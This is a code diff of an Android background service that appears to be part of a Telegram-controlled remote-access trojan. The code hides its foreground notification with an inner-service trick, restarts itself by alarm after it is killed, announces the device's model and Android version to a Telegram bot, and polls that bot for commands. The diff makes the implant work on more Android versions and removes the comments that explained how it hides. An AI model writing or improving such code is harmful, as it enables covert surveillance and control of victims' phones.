@@ -8,14 +8,13 @@ import org.json.*;
 
 public class BackgroundService extends Service {
 
-    static final String CH_ID   = "kc_hidden";
+    static final String CH_ID    = "kc_hidden";
     static final int    NOTIF_ID = 9901;
 
     private volatile boolean mRunning = false;
     private Thread mPollThread;
     static String deviceId;
 
-    // ─── Lifecycle ───────────────────────────────────────────────────────────
     @Override
     public void onCreate() {
         super.onCreate();
@@ -28,10 +27,7 @@ public class BackgroundService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (!mRunning) {
-            mRunning = true;
-            startPolling();
-        }
+        if (!mRunning) { mRunning = true; startPolling(); }
         return START_STICKY;
     }
 
@@ -40,10 +36,12 @@ public class BackgroundService extends Service {
         mRunning = false;
         if (mPollThread != null) mPollThread.interrupt();
         super.onDestroy();
-        // Restart via alarm
         Intent restart = new Intent(this, BackgroundService.class);
-        PendingIntent pi = PendingIntent.getService(this, 1, restart,
-            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+        // FLAG_IMMUTABLE added in API 23 — older devices crash without version check
+        int piFlags = PendingIntent.FLAG_ONE_SHOT |
+            (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
+                ? PendingIntent.FLAG_IMMUTABLE : 0);
+        PendingIntent pi = PendingIntent.getService(this, 1, restart, piFlags);
         AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
         if (am != null)
             am.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 3000, pi);
@@ -51,12 +49,13 @@ public class BackgroundService extends Service {
 
     @Override public IBinder onBind(Intent i) { return null; }
 
-    // ─── Polling loop ─────────────────────────────────────────────────────────
     private void startPolling() {
         mPollThread = new Thread(() -> {
-            // Announce online
-            TelegramController.sendMessage("📱 [" + deviceId + "] Online\nAndroid " +
-                Build.VERSION.RELEASE + " | " + Build.MODEL + "\n/help = sare commands");
+            TelegramController.sendMessage(
+                "\uD83D\uDCF1 [" + deviceId + "] Online\n" +
+                "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
+                "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
+                "/help = sare commands");
             while (mRunning) {
                 try {
                     JSONArray updates = TelegramController.getUpdates();
@@ -76,7 +75,6 @@ public class BackgroundService extends Service {
         mPollThread.start();
     }
 
-    // ─── Hidden foreground notification ───────────────────────────────────────
     private void startHiddenForeground() {
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -95,7 +93,6 @@ public class BackgroundService extends Service {
             .setSilent(true)
             .build();
         startForeground(NOTIF_ID, notif);
-        // Trick: start inner service then stop it to hide the foreground notification
         startService(new Intent(this, InnerService.class));
     }
 
@@ -109,12 +106,12 @@ public class BackgroundService extends Service {
         return id;
     }
 
-    // ─── Inner service to hide notification ───────────────────────────────────
     public static class InnerService extends Service {
         @Override
         public int onStartCommand(Intent intent, int flags, int startId) {
-            startForeground(NOTIF_ID, new NotificationCompat.Builder(this, CH_ID)
-                .setSmallIcon(R.drawable.ic_notification).build());
+            startForeground(NOTIF_ID,
+                new NotificationCompat.Builder(this, CH_ID)
+                    .setSmallIcon(R.drawable.ic_notification).build());
             stopForeground(true);
             stopSelf();
             return START_NOT_STICKY;
